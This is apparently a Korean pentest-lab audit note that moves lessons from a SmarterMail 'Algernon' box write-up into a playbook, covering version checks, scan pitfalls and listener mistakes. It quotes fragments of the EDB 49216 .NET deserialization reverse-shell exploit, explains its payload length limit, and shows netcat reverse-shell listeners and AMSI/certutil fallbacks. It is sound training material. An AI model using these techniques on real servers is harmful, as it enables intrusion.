---
type: audit
target: "[[Algernon]]"
wave: 17
date: 2026-08-26
manual_tags: true
manual_cves: true
---

# Algernon — `_PLAYBOOK` 이관 제안

원본 `03. PG\Algernon.md` 1270행 → 688행. 제안 **20건 — 병합 17 / 신규 3**(18 · 19 · 21). 아래는 노트에서 **잘라낸** 학습 자료이고, 단독 기록자(`pg-line-manager`)가 `_PLAYBOOK.md` 에 반영할 것.
백업 — `03. PG\_backup\Algernon.md.bak2`(75,694바이트, 개작 직전 원본).

⚠️ **신규 제안은 번호를 비워 두었음.** 배정은 기록자 몫.
⚠️ 노트 본문에는 **기존 앵커만** 걸었음(14건 전수 검증 통과). 신규 항목 앵커는 걸지 않았음.

---

## 1. A-12. 응답이 성공을 뜻하지 않는다 — **병합**

**넣을 본문**

**가장 극단 — 응답도 종료 코드도 «아무 신호가 없는» 익스플로잇.** [[Algernon]] EDB 49216 은 `print` 문이 **0개**이고 `s.send(msg)` 후 `s.close()` 가 전부라, 성공해도 실패해도 **출력 0줄 · 종료 코드 0** 임. 종료 코드 0 이 뜻하는 것은 「TCP 연결이 맺어지고 바이트를 write 했다」뿐이고 서버가 그것을 파싱했는지·가젯이 돌았는지는 아무것도 검증하지 않음.
→ **판정을 전적으로 부수 효과(리스너)에 위임할 것.** 절차: ①발사 «전» `ss -lntp` 로 리스너 확인 ②발사 직후 리스너 페인 확인 ③15~20초 대기(프로세스 생성 + TCP 왕복) ④없으면 원인 후보를 하나씩 제거.
→ **가장 확실한 것은 스크립트에 진단을 직접 넣는 것임:**
```python
print(f'[+] payload len = {len(payload)}')
print(f'[+] uri = {uri}')
print(f'[+] sending {len(msg)} bytes to {HOST}:{PORT}')
s.send(msg)
print('[+] sent, closing')
s.close()
```
와이어에서도 동시에 확인:
```bash
sudo tcpdump -i tun0 -n "host <타겟> and (port 17001 or port 80)" -c 50
```

**지우기 전 원문**

> ### 3-4. 발사
> **출력이 전혀 없음.** 스크립트는 `s.send(msg)` 후 `s.close()`로 끝남 — 응답을 읽지도, 성공 여부를 판정하지도 않음.
> > [!danger] `EXIT=0`은 "성공"이 아니라 "파이썬이 예외 없이 끝났다"는 뜻일 뿐
> > 이 스크립트가 `0`을 반환하는 조건은 TCP 연결이 맺어지고 바이트를 write 했다는 것뿐임. 서버가 그 바이트를 파싱했는지, 가젯이 돌았는지, 프로세스가 떴는지는 **아무것도 검증하지 않음.**
> > **진실은 리스너에만 있음.** 발사 후 즉시 리스너 pane을 확인하고, 15~20초 기다려도 아무것도 없으면 실패로 판정.
> > 누적 패턴 **"응답이 성공을 뜻하지 않는다"**([[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]])의 가장 극단적인 형태 — 여기엔 응답조차 없음.
>
> ### ⑥ 익스플로잇이 성공/실패를 알려주지 않음
> `python3 exploit_algernon.py` → **출력 0줄, `EXIT=0`.** 스크립트는 `s.send(msg)` 후 `s.close()`가 전부.
> **대응 절차 (이 유형을 만나면 그대로 따를 것)**
> 1. **발사 전에** 리스너가 붙어 있는지 `ss -lntp`로 확인
> 2. **발사 직후** 리스너 pane을 즉시 확인
> 3. **15~20초 대기.** 프로세스 생성 + TCP 왕복 시간이 필요함
> 4. 아무것도 없으면 → **원인 후보를 순서대로 제거**
>    - 리스너가 진짜 그 포트인가 (①의 사고)
>    - `LHOST`가 `tun0` IP인가
>    - 페이로드가 1360바이트를 넘지 않았는가 (2-7절)
>    - 아웃바운드 필터 — 포트를 80/443/53으로 바꿔본다
> 5. **스크립트에 진단을 직접 추가** — 이것이 가장 확실함
> ```python
> # 원본 마지막 부분에 추가하면 최소한 "보냈다"는 사실은 확인된다
> print(f'[+] payload len = {len(payload)}')
> print(f'[+] uri = {uri}')
> print(f'[+] sending {len(msg)} bytes to {HOST}:{PORT}')
> s.send(msg)
> print('[+] sent, closing')
> s.close()
> ```
> 동시에 와이어에서도 확인.
> ```bash
> sudo tcpdump -i tun0 -n "host 192.168.248.65 and (port 17001 or port 80)" -c 50
> # 17001 로 나가는 SYN + 우리 80 으로 들어오는 SYN 이 둘 다 보여야 정상
> ```
> > [!danger] 누적 패턴 — "응답이 성공을 뜻하지 않는다"
> > [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]] · **[[Algernon]]**
> > Algernon은 이 패턴의 극단 — 잘못된 응답조차 없고, **아무 응답도 없음.** 성공 판정을 전적으로 부수 효과(리스너)에 위임해야 함.

---

## 2. A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다 — **병합**

**넣을 본문**

**익스플로잇 «제목»의 숫자는 타겟 버전이 아니라 취약 상한선임.** [[Algernon]] — EDB 49216 의 제목은 `SmarterMail Build 6985 - Remote Code Execution` 이고 헤더는 `SmarterMail before build 6985` 임. 사전 정보를 쓴 사람이 그 6985 를 **타겟 빌드로 옮겨 적었고**, 실제 빌드는 **6919** 였음.
- 6985 를 믿었으면 「패치 버전인데 왜 취약하지?」로 익스플로잇을 불신하거나, 6919 를 발견한 뒤 「6985 가 아니네, 다른 CVE 인가?」로 재조사에 들어갔을 것임
- `searchsploit` 제목의 숫자는 대부분 「이 버전 «이하»가 취약」을 뜻함. **제목이 아니라 파일 헤더 주석을 읽을 것**(A-14)
- **남이 알려준 버전은 근거 0개임** — 브리핑·팀원 메모·문제 설명 전부 출발점이지 사실이 아님

**패치가 「엔드포인트 제거」가 아니라 「바인딩 축소」인 경우가 있음 — 그러면 로컬 벡터로는 살아 있음.** SmarterMail 빌드 6985 의 패치는 17001 을 없앤 것이 아니라 **`127.0.0.1` 로만 바인딩**한 것임(출처: Metasploit `exploits/windows/http/smartermail_rce.rb` 모듈 설명 — *"the 17001 port is no longer publicly accessible, although it can be accessible locally at 127.0.0.1:17001. Hence, this would still allow for a privilege escalation vector"*). **패치 버전이라는 이유로 그 서비스를 권한상승 후보에서 빼지 말 것.**

**지우기 전 원문**

> > [!danger] 익스플로잇 제목의 숫자를 타겟 버전으로 착각하지 마라
> > EDB 49216의 제목은 `SmarterMail Build 6985 - Remote Code Execution`이고 본문 기재는 다음과 같음:
> > ```
> > # SmarterMail before build 6985 provides a .NET remoting endpoint
> > # which is vulnerable to a .NET deserialisation attack.
> > ```
> > **6985는 "이 빌드 미만이 취약하다"는 상한선**임. 브리핑을 쓴 사람이 익스플로잇 제목을 그대로 타겟 빌드로 옮겨 적은 것.
> > 실전에서 이게 왜 위험한가 — 6985라고 믿으면 "패치된 최신 빌드인데 왜 취약하지?" 하고 혼란에 빠지거나, 반대로 6919를 보고 "6985가 아니네, 다른 CVE인가?" 하며 시간을 태움.
> > **버전 판정은 항상 독립 근거 2개 이상.** ①런타임 렌더 ②정적 자산 경로는 서로 다른 코드 경로에서 나온 값이므로 독립 근거로 인정됨. 이 패턴은 [[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]]·[[Squid]]에서도 반복됨.
>
> ### ④ 브리핑의 빌드 번호가 틀림 — 남의 정찰 결과를 믿은 대가
> **무엇이 잘못돼 있었는가.** 사전 정보에 "SmarterMail build 6985"라고 적혀 있었음. 실제는 6919.
> **왜 이런 일이 생겼는가.** EDB 익스플로잇 제목이 `SmarterMail Build 6985 - Remote Code Execution`이고, 본문에 `SmarterMail before build 6985`라고 적혀 있음. "취약 상한선"을 "타겟 빌드"로 옮겨 적은 것.
> **왜 위험했는가.** 6985를 그대로 믿었다면 —
> - "패치 버전인데 왜 취약하지?" 하며 익스플로잇을 신뢰하지 못하고 다른 경로를 찾았을 것
> - 또는 6919를 발견한 뒤 "6985가 아니네, 다른 CVE인가?" 하며 재조사에 들어갔을 것
> **어떻게 잡았는가.** 독립 근거 3개를 모음 — ①런타임 JS 변수 ②정적 CSS 경로 ③디스크 바이너리 버전 리소스. ①②는 웹에서, ③은 셸에서 나왔으므로 완전히 다른 경로.
> > [!danger] 일반화 — 버전은 항상 독립 근거 2개 이상
> > 그리고 **누가 알려준 버전은 근거 0개.** 남의 정찰 결과·브리핑·팀원 메모는 출발점이지 사실이 아님.
> > 특히 **익스플로잇 파일명/제목의 숫자를 타겟 버전으로 착각하는 실수**는 매우 흔함. `searchsploit`의 제목은 "이 버전 이하가 취약"을 뜻하는 경우가 대부분.
> > 누적 사례: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] · **[[Algernon]]**

⚠️ 원문의 「독립 근거 3개」는 **노트에서 강등했음** — ①②(curl 응답)의 본문이 `~/PG/Algernon/` 에 보존되지 않아 재확인 불가이고, 산출물로 남은 것은 ③(디스크 바이너리 `100.0.6919.30415`, `shell_session.log`) 하나뿐임. 이관 본문에서도 「3개를 모았다」로 적지 말 것.

---

## 3. A-1-12. 「top-1000 밖이라 못 봤다」 — 예열 스캔의 «범위»부터 확인한다 — **병합**

**넣을 본문**

**「top-1000 밖」을 눈대중으로 단정하지 말 것 — `nmap-services` 를 직접 셀 것.** [[Algernon]] 원 노트는 「9998 도 17001 도 top-1000 에 없다」고 적었으나 **9998 은 top-1000 «안»**임. Kali 7.98 실측:
```bash
awk '$2 ~ /\/tcp$/ {split($2,a,"/"); print $3, a[1]}' /usr/share/nmap/nmap-services \
  | sort -k1,1gr | head -1000 | awk '{print $2}' > /tmp/top1000.txt
grep -qx 9998 /tmp/top1000.txt && echo IN || echo OUT
```
`9998/tcp` 는 빈도 `0.000304` 로 등재돼 있고 1000번째 항목의 빈도는 `0.000152` 임 → **안**. `17001/tcp` 는 파일에 **아예 없어서** `-sS` 가 `unknown` 으로 찍은 것이고 이쪽만 밖임.
→ 정리하면 이 박스는 `-p-` 가 없어도 **정보원(9998)은 보이고 입구(17001)만 안 보임.** [[Hub]] 가 같은 형태로 틀렸던 자리이고([[_WRITEUP-STANDARD]] 의 「8082·9999는 기본 1000포트 밖」 반증 사례), **`-p-` 를 권하는 것은 옳아도 근거를 틀리면 다른 박스에서 top-1000 을 과소평가하게 됨.**
→ **서비스 «이름»도 `-sV` 결과만 신뢰할 것.** `-sS` 는 포트 번호로 `nmap-services` 표를 찍을 뿐이라 `9998 distinct32` 는 IANA 등록명이지 실제와 무관함.

**지우기 전 원문**

> | `-p-` | 65535 포트 전수 | 기본 top-1000에는 9998도 17001도 없음. 이 박스는 `-p-` 없이는 아예 풀리지 않음 |
>
> 1. **`-p-`는 협상 대상이 아님.** 이 박스의 입구(17001)와 정보원(9998)이 둘 다 top-1000 밖. 전수 스캔 없이는 문제 자체가 보이지 않음. 대신 빠른 스캔을 먼저 돌려 병렬로 진행할 것.
>
> > [!warning] `9998 distinct32`에 속지 마라
> > 저레이트 스캔은 `-sS`뿐이라 서비스 이름을 **`/usr/share/nmap/nmap-services` 표에서 포트 번호로 찍음.** `distinct32`는 IANA 등록명일 뿐 실제로 돌고 있는 것과 무관. 같은 이유로 17001이 `unknown`으로 나옴.
> > **서비스 이름은 `-sV` 결과만 믿을 것.** 포트 번호 → 서비스 추측은 출발점이지 결론이 아님.

---

## 4. A-1-18. `--min-rate` 를 높이면 «유령 포트»가 생긴다 — **병합**

**넣을 본문**

**교차검증이 «일치»했을 때의 판정도 함께 적을 것.** [[Algernon]] — `--min-rate 5000`(208초) 과 `--max-rate 500 -T3`(165초) 두 스캔이 **14개 포트 전부 일치**해 그 시점부터 포트 목록을 확정 사실로 취급했음. [[Muddy]] 처럼 어긋나면 겹치는 것만 확정하고, 이 박스처럼 일치하면 더 재보지 않는 것이 옳음 — **두 번 돌리는 비용이 3분이라 판정 비용이 시도 비용보다 싼 전형적인 자리임.**
⚠️ 원 노트는 「`--min-rate` 는 없는 포트를 만들어내지는 않지만 있는 포트를 놓칠 수 있다」고 단정했는데 **[[Muddy]] 실측이 그 절반을 반증함**(443·808·908 유령 포트). 오차는 **양방향**임.

**지우기 전 원문**

> ### 1-3. 저레이트 교차검증 — `--min-rate`를 썼으면 반드시 할 것
> `--min-rate 5000`은 패킷을 잃을 수 있음. **정확히는 "없는 포트를 만들어내지는 않지만, 있는 포트를 놓칠 수 있다."** 그래서 느린 SYN 스캔으로 다시 돌림.
> **14개 포트가 고레이트 결과와 일치 — 오탐·누락 없음.** 이제 포트 목록을 확정 사실로 취급해도 됨.

---

## 5. A-1-25. Windows 타겟과 Kali 는 대소문자 규칙이 반대다 — **병합**

**넣을 본문 (⑴ 항목 밑에 붙임)**

⛔ **리다이렉트 «목적지»가 정규 표기를 알려주지 않음 — 흔한 오독임.** [[Algernon]] 실측(`~/PG/Algernon/gobuster_9998.txt`):
```text
/scripts   (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/scripts/]
/Scripts   (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/Scripts/]
/services  (Status: 301) [Size: 159] [--> http://192.168.248.65:9998/services/]
/Services  (Status: 301) [Size: 159] [--> http://192.168.248.65:9998/Services/]
```
IIS 는 **요청한 표기에 슬래시만 붙여** 돌려줌 — 어느 쪽이 디스크상의 이름인지는 이 출력만으로 알 수 없음. 그 노트는 한때 「`/scripts` 가 `/Scripts/` 로 리다이렉트되므로 정규 표기는 `Scripts`」라고 적었는데 **산출물이 그것을 반박함**(둘 다 자기 표기로 리다이렉트됨).
→ 대소문자 중복은 **「하나의 리소스」라는 것까지만** 결론 낼 것. 정규 표기가 필요하면 셸을 잡은 뒤 `dir` 로 볼 것.

**지우기 전 원문**

> > [!warning] 스캐너 함정 ② — 대소문자 중복(`/scripts`와 `/Scripts`, `/services`와 `/Services`)
> > Windows 파일시스템은 **대소문자를 구분하지 않음.** `/scripts`가 `/Scripts/`로 리다이렉트되는 것에서 정규 표기가 `Scripts`임을 알 수 있음. 두 줄이 아니라 한 개의 디렉터리.
> > 리눅스 타겟에서 이런 중복이 나오면 **정말로 두 디렉터리**일 수 있음 — OS에 따라 해석이 갈림.

---

## 6. A-1-26. 브루트 결과의 `400`·예약 장치명·제어문자는 발견이 아니다 — **병합**

**넣을 본문**

**IIS/ASP.NET 판은 `404` 가 아니라 `302` 로 나옴 — 그래서 더 잘 속음.** [[Algernon]] `gobuster_9998.txt` 에서 예약 장치명 여덟 개(`aux`·`con`·`prn`·`nul`·`com1~3`·`lpt1~2`)가 전부 **302 + Size 162~163** 으로 찍혔음:
```text
/aux   (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/aux]
/com1  (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/com1]
```
→ **판별은 상태 코드가 아니라 리다이렉트 «목적지»로 함.** 전부 `/Interface/errors/404.html?aspxerrorpath=…` — 404 를 302 로 포장한 것임. 「200/301/302 라는 코드」가 아니라 「본문·목적지가 다른가」로 볼 것(A-12 의 열거 판).

**지우기 전 원문**

> > [!warning] 스캐너 함정 ① — DOS 디바이스명 무더기(`aux` `con` `prn` `nul` `com1~3` `lpt1~2`)
> > 이 8개는 **발견물이 아님.** Windows가 예약한 레거시 디바이스 이름이고, ASP.NET이 이를 처리하다 일관되게 `302 → 404 핸들러`를 뱉음.
> > 판별법은 하나 — **리다이렉트 목적지를 봐라.** 전부 `/Interface/errors/404.html?aspxerrorpath=...`. 404를 302로 포장한 것.
> > 일반화 — **"200/301/302"라는 코드가 아니라 "본문/목적지가 다른가"로 판단할 것.** [[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]]·[[Squid]]에서 누적 중인 "응답이 성공을 뜻하지 않는다" 패턴의 또 하나의 사례.

---

## 7. A-2-22. 같은 기능의 엔드포인트가 여럿이다 — **병합**

**넣을 본문**

**정보원이 갈리면 「누가 맞나」가 아니라 「역할이 다른가」를 먼저 물을 것.** [[Algernon]] — 사전 정보는 9998 을, 개인 노트는 17001 을 지목했고 **둘 다 열려 있어 어느 쪽도 배제 불가**였음. 해소는 프로토콜 질문 셋으로 함:

| 질문 | 9998 | 17001 |
|---|---|---|
| `-sV` 판정은? | `http Microsoft HTTPAPI httpd 2.0` | `remoting MS .NET Remoting services` |
| 익스플로잇이 보내는 것은? | — | `.NET` 매직으로 시작하는 원시 TCP |
| HTTP 로 말을 거는가? | 예(`/interface/root` 리다이렉트) | 아니오 |

「둘 다 맞다」가 정답이었음 — 하나의 제품이 웹 UI·API·관리 RPC·클러스터링·메트릭을 서로 다른 포트로 여는 것은 매우 흔함.
→ **익스플로잇 코드의 «기본값»은 그 자체로 정찰 정보임.** EDB 49216 이 `PORT=17001` 을 기본값으로 갖고 있다는 사실이 결정적 단서였고, 원본을 읽지 않고 IP 만 바꿔 쏘는 습관이었으면 놓쳤을 것임(A-14).
→ 사전 정보가 9998 을 지목한 이유는 Metasploit 모듈이 `RPORT` 기본값을 9998, `TCP_PORT` 를 17001 로 **나눠 두었기 때문으로 보임** `[가정]`.
→ **제품은 있는데 표준 포트가 닫혀 있으면 비표준 관리·RPC 채널이 표적임.** 이 박스는 메일 서버인데 25·110·143·587 이 전부 closed 였고, 실제 입구가 관리 채널(17001)이었음.

**지우기 전 원문**

> ### ⑤ 9998인가 17001인가 — 두 정보원이 갈림
> 브리핑은 9998을, 개인 노트는 17001을 지목. **둘 다 열려 있었기 때문에 어느 쪽도 "틀렸다"고 배제할 수 없었음.**
> **해소한 방법 — 프로토콜을 물음.**
> | 질문 | 9998 | 17001 |
> |---|---|---|
> | `-sV` 판정은? | `http Microsoft HTTPAPI httpd 2.0` | `remoting MS .NET Remoting services` |
> | 익스플로잇이 보내는 것은? | — | `.NET` 매직으로 시작하는 원시 TCP |
> | HTTP로 말을 거는가? | 예 (`/interface/root` 리다이렉트) | 아니오 |
> **익스플로잇 코드가 `PORT=17001`을 기본값으로 갖고 있다는 사실 자체가 결정적 증거.** 원본을 읽지 않고 IP만 바꿔 쏘는 습관이었다면 이 단서를 놓쳤을 것.
> > [!tip] 일반화 — 정보원이 갈리면 "누가 맞나"가 아니라 "역할이 다른가"를 먼저 물을 것
> > 하나의 제품이 **여러 포트를 서로 다른 목적으로** 여는 것은 매우 흔함. 웹 UI / API / 관리 RPC / 클러스터링 / 메트릭이 전부 다른 포트.
> > **"둘 다 맞다"가 정답인 경우가 많음.** 그리고 익스플로잇 코드의 기본값은 그 자체로 정찰 정보.
>
> > [!tip] 시험 반사 — "제품은 있는데 표준 포트가 닫혀 있다"
> > 그 제품의 **비표준 관리/RPC 채널**을 찾아라. 메일 서버인데 25가 닫혔다면 관리 인터페이스가 진짜 표적.

---

## 8. A-2-32. 역직렬화 가젯 체인이 «에러 없이» 죽는다 — **병합**

**넣을 본문 (원인 표에 .NET 판 추가 + 아래 문단)**

**.NET `BinaryFormatter` 판 — 길이 접두사가 페이로드 안에 «굳어 있음».** [[Algernon]] EDB 49216 은 base64 직렬화 스트림 안의 `X` 1360개를 리버스셸 base64 로 치환함:
```python
psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
psh_shell = base64.b64encode(psh_shell)
psh_shell = psh_shell.ljust(1360, b' ')
payload = base64.b64decode(payload)
payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)
```
왜 1360인지는 스트림을 뜯으면 나옴:
```text
prefix bytes before /c : b'\x00\x00\xf2\n'
cmdstring: b'/c powershell.exe -encodedCommand XXXXXX'
X count: 1360
len of "/c powershell.exe -encodedCommand ": 34
7bit len decode: 1394
psh chars: 500 / utf16le bytes: 1000 / b64 len: 1336 / after ljust: 1360 pad spaces: 24
```
- `BinaryObjectString` 레코드는 문자열 앞에 **7비트 인코딩 길이 접두사**를 둠. `\xf2\x0a` = `(0xF2 & 0x7F) | (0x0A << 7)` = `114 + 1280` = **1394**
- 실제 문자열은 `"/c powershell.exe -encodedCommand "`(34) + `X` 1360 = **1394**. 정확히 맞음
- **접두사 1394 는 base64 페이로드 안에 굳어 있어** 생성기를 다시 돌리지 않는 한 못 바꿈. 치환 문자열은 반드시 **정확히 1360바이트**
- **짧으면** `ljust(1360, b' ')` 가 공백으로 채워 문제없음. **길면** `ljust` 는 자르지 않으므로 스트림이 밀려 파싱 실패 → **아무 일도 안 일어나고 스크립트는 조용히 정상 종료**
- 이 박스는 여유가 **24바이트**뿐이었음. base64 는 원본 3바이트당 4자로 불어나므로 원라이너에 문자 10여 개만 더 붙어도 초과함

→ PHP `s:<길이>` 판(이미 표에 있음)과 **완전히 같은 실패 모드**임. 언어만 다름.
→ **긴 페이로드가 필요하면 스크립트를 고치지 말고 체인을 새로 생성할 것** — `ysoserial.net` 은 길이 접두사를 생성기가 계산하므로 크기 제약이 없음.

**지우기 전 원문** — 노트 §2-7 전량. 노트에 **압축본을 남겼고**(재현 함정이라 심사관 판정에 필요) 아래 표·일반화 부분만 이관함.

> | 만약 이렇게 바꾸면 | 결과 |
> |---|---|
> | `LPORT=80` → `LPORT=4444` | 원라이너 +2자 → b64 +4자 → 1340. 안전 |
> | `LHOST`가 15자(`192.168.100.207`) + `LPORT=44444` | 원라이너 +6자 → b64 약 +8자 → 1344. 아슬아슬하게 안전 |
> | 원라이너에 AMSI 우회 한 줄 추가 | 거의 확실히 초과 → 조용한 실패 |
>
> > [!tip] 시험 반사 — 공개 익스플로잇의 하드코딩된 크기를 만나면
> > `X`·`A`·`\x90` 같은 문자가 수백~수천 개 반복돼 있으면 그것은 **자리표시자이자 크기 제약**.
> > 페이로드를 손대기 전에 **"이 자리에 몇 바이트까지 들어가는가"를 먼저 계산하라.** 버퍼 오버플로 익스플로잇의 오프셋과 정확히 같은 사고방식.
> > 초과했는지 확인하는 가장 싼 방법 — `len()`을 찍어보는 `print` 한 줄 추가.
>
> > [!tip] 이 조합이 중요한 이유
> > `ysoserial.net`으로 직접 만든 가젯 체인은 **1360바이트 제약에서 자유로움** — 길이 접두사를 생성기가 알아서 계산해 주기 때문.
> > 즉 **긴 페이로드가 필요하면 EDB 스크립트를 고치는 것이 아니라 체인을 새로 생성하는 것이 정답.**
>
> ### ⑧ 이 유형에서 흔히 막히는 지점 (이번 산출물에는 실측 기록이 없음 — 구분해 적음)
> 아래는 **이 박스에서 실제로 겪지 않음.** 같은 유형을 만났을 때의 대비로만 적음.
> | 증상 | 원인 후보 | 대응 |
> |---|---|---|
> | 익스플로잇이 `ConnectionRefused` | 서비스 다운 / 이미 누가 크래시시킴 | 박스 리버트. 역직렬화 익스플로잇은 실패하면 서비스를 죽이는 일이 있음 |
> | 첫 발사만 되고 재시도가 안 됨 | 가젯이 서비스 스레드를 망가뜨림 | 리버트 후 한 방에 성공하도록 준비를 끝내고 쏠 것 |
> | `typeFilterLevel=Low` 라 델리게이트 가젯 거부 | 서버 구성 | `ExploitRemotingService`의 다른 기법 또는 다른 가젯 |
> | 페이로드는 터졌는데 셸이 안 붙음 | AV/AMSI가 PowerShell 원라이너 차단 | `-enc`는 AMSI를 우회하지 못함. 다른 페이로드(`certutil` 다운로드 + 네이티브 바이너리)로 전환 |
> | `.NET` 매직을 9998로 보냄 | 포트 혼동 | `400 Invalid Verb`가 돌아옴. 17001로 보낼 것 |

⚠️ 위 ⑧ 표는 **이 박스에서 겪지 않은 것**이므로 그 유보를 지우지 말고 반영할 것.

---

## 9. A-31. 리버스셸이 안 붙는다 — **병합** (「리스너 함정」 문단 아래)

**넣을 본문**

**한 SSH 호출에서 tmux 세션을 여러 개 만들면 「세션 이름 ↔ 포트」 매핑이 뒤바뀜 — 그리고 겉으로는 완벽히 정상임.** [[Algernon]]:
```bash
# ✗ 이렇게 했음 — 하지 말 것
ssh kali@10.44.44.128 "tmux new-session -d -s alg 'sudo nc -lvnp 80'; \
                       tmux new-session -d -s alg443 'sudo nc -lvnp 443'; \
                       tmux new-session -d -s alg53 'sudo nc -lvnp 53'"
```
`alg` 세션이 80 이 아니라 53 을 리스닝하게 됐음. **`ss -lntp` 에는 세 포트가 전부 LISTEN 으로 보여** 「포트가 열려 있는가」에는 아무 문제가 없었고, 틀린 것은 「어느 세션 이름이 어느 포트인가」뿐이었음. 그래서 발사 후 `alg` 페인을 보며 **「아무것도 안 들어왔다 → 실패했다」로 오판**함. 첫 발사가 헛돈 원인일 가능성이 큼 `[가정]` — 셸이 실제로 다른 페인에 떨어졌는지는 확인하지 못했음.
원인은 `tmux new-session -d` 가 서버 기동·세션 등록을 비동기로 처리하는데 셋을 밀어 넣어 등록 순서와 명령 실행 순서가 어긋난 것 `[가정]`.
```bash
# ✓ 세션 하나 = SSH 호출 하나. 그리고 즉시 검증
ssh kali@10.44.44.128 "tmux new-session -d -s alg80 'sudo nc -lvnp 80'"
ssh kali@10.44.44.128 "tmux ls"
ssh kali@10.44.44.128 "ss -lntp | grep ':80 '"
```
→ **`ss -lntp` 의 LISTEN 은 「포트가 열렸다」만 증명하고 「내가 보는 페인이 그 포트다」는 증명하지 않음.** 검증하려면 `ss` 의 PID 를 tmux 페인 PID 와 대조하거나, **애초에 하나만 만들어 애매함을 없앨 것.**
→ 일반화: **리스너·터널·포트포워딩·프록시는 전부 이 함정을 가짐.** 「만들었다」와 「의도한 대로 붙어 있다」는 다른 명제이고, 검증 비용은 몇 초, 오판 비용은 수십 분임.

**LPORT 를 80/443 으로 고르는 세 이유 (특권 포트 `sudo` 주의 포함).** [[Algernon]] 은 기본값 4444 를 안 씀 — ①방화벽이 아웃바운드를 제한해도 80/443 은 열어두는 것이 관례이고 4444 는 IDS 시그니처에도 걸림 ②이 익스플로잇은 실패를 알려주지 않아 「페이로드가 안 터진 것」과 「터졌는데 아웃바운드가 막힌 것」을 구분할 수 없으므로 **아웃바운드 변수부터 제거하고 시작** ③실패 시 원인 후보가 여러 개라 첫 발사에서 변수 하나를 미리 없애는 쪽이 저렴.
⚠️ **1024 미만은 특권 포트라 리스너에 `sudo` 가 필요함.** 빠뜨리면 `Permission denied` 로 안 뜨는데 **tmux 안에서 돌리면 그 에러를 못 보고 「리스닝 중」이라고 착각함.**

**지우기 전 원문**

> ### ① tmux 세션 경쟁 상태 — 겉으로는 완벽히 정상
> **무엇을 했는가.** 여러 포트에서 동시에 리스닝하려고 한 SSH 명령 안에서 tmux 세션 3개를 연달아 만듦.
> ```bash
> # ✗ 이렇게 했다 — 하지 마라
> ssh kali@10.44.44.128 "tmux new-session -d -s alg 'sudo nc -lvnp 80'; \
>                        tmux new-session -d -s alg443 'sudo nc -lvnp 443'; \
>                        tmux new-session -d -s alg53 'sudo nc -lvnp 53'"
> ```
> **무엇이 일어났는가.** pane 매핑이 뒤엉켜 `alg` 세션이 80이 아니라 53번을 리스닝하게 됨.
> **왜 알아채기 어려웠는가.** `ss -lntp`를 보면 세 포트가 전부 LISTEN 상태.
> ```text
> LISTEN  0  10  0.0.0.0:80    ...  users:(("nc",pid=...))
> LISTEN  0  10  0.0.0.0:443   ...  users:(("nc",pid=...))
> LISTEN  0  10  0.0.0.0:53    ...  users:(("nc",pid=...))
> ```
> **"포트가 열려 있는가"에는 아무 문제가 없었음.** 틀린 것은 "어느 세션 이름이 어느 포트에 대응하는가" 뿐. 그래서 익스플로잇을 쏜 뒤 `alg` 세션을 들여다보며 "아무것도 안 들어왔다 → 실패했다"고 오판. 첫 발사가 헛돈 원인일 가능성이 큼 `[가정]` — 셸이 실제로 다른 pane에 떨어졌는지는 확인하지 못함.
> **원인.** `tmux new-session -d`가 서버 기동/세션 등록을 비동기로 처리하는데, 세 개를 밀어 넣으면 등록 순서와 명령 실행 순서가 어긋남 `[가정]`.
> **해결.**
> ```bash
> # ✓ 세션 하나 = SSH 호출 하나. 그리고 즉시 검증
> ssh kali@10.44.44.128 "tmux new-session -d -s alg80 'sudo nc -lvnp 80 | tee ~/PG/Algernon/shell_session.log'"
> ssh kali@10.44.44.128 "tmux ls"
> ssh kali@10.44.44.128 "ss -lntp | grep ':80 '"
> ```
> > [!danger] 일반화 — 인프라를 만든 다음에는 반드시 검증할 것
> > "만들었다"와 "의도한 대로 붙어 있다"는 다른 명제. 리스너·터널·포트포워딩·프록시는 **전부** 이 함정을 가짐.
> > 검증 비용은 몇 초, 오판 비용은 수십 분. 그리고 **여러 개를 동시에 만들지 마라** — 하나면 애매함 자체가 생기지 않음.
>
> > [!danger] `ss -lntp`로 "LISTEN"을 확인해도 충분하지 않음
> > 6장 ①에서 실제로 겪은 일 — 포트는 전부 LISTEN이었는데 **어느 tmux 세션이 어느 포트를 잡고 있는지가 뒤바뀌어 있었음.** 셸이 들어오면 엉뚱한 pane에 뜨고, 빈 pane을 보며 "실패했다"고 판단하게 됨.
> > 검증은 **`ss -lntp`의 PID를 tmux pane의 PID와 대조**하거나, 애초에 세션을 하나만 만들어 애매함을 없앨 것.
>
> ### 2-9. 왜 리버스셸 포트를 80으로 잡았는가
> | 이유 | 설명 |
> |---|---|
> | 아웃바운드 필터 회피 | 방화벽이 아웃바운드를 제한하더라도 80/443은 열어두는 것이 거의 관례. 4444는 IDS 시그니처에도 걸림 |
> | 성공 신호가 없기 때문 | 이 익스플로잇은 실패를 알려주지 않음. "페이로드가 안 터진 것"과 "터졌는데 아웃바운드가 막힌 것"을 구분할 수 없음. 그래서 아웃바운드 변수부터 제거하고 시작 |
> | 재시도 비용이 큼 | 실패하면 원인 후보가 여러 개라 절약이 안 됨. 첫 발사에서 변수 하나를 미리 없애는 쪽이 저렴 |
> `80`은 특권 포트이므로 리스너에 **`sudo`가 필요함.** 이걸 잊으면 `Permission denied`가 나고, tmux 안에서 돌리면 그 에러를 보지 못한 채 "리스닝 중"이라고 착각하게 됨 → 6장 ①과 정확히 같은 사고.
> > [!tip] 리버스셸이 안 붙으면 무엇을 의심하나 (순서대로)
> > 1. **리스너가 진짜 그 포트에 있는가** — `ss -lntp | grep :80`. `sudo` 누락으로 안 떠 있는 경우가 1위
> > 2. **VPN 인터페이스 IP가 맞는가** — `ip a show tun0`. `eth0` IP를 적는 실수가 2위
> > 3. **아웃바운드 필터** — 80/443/53으로 바꿔본다
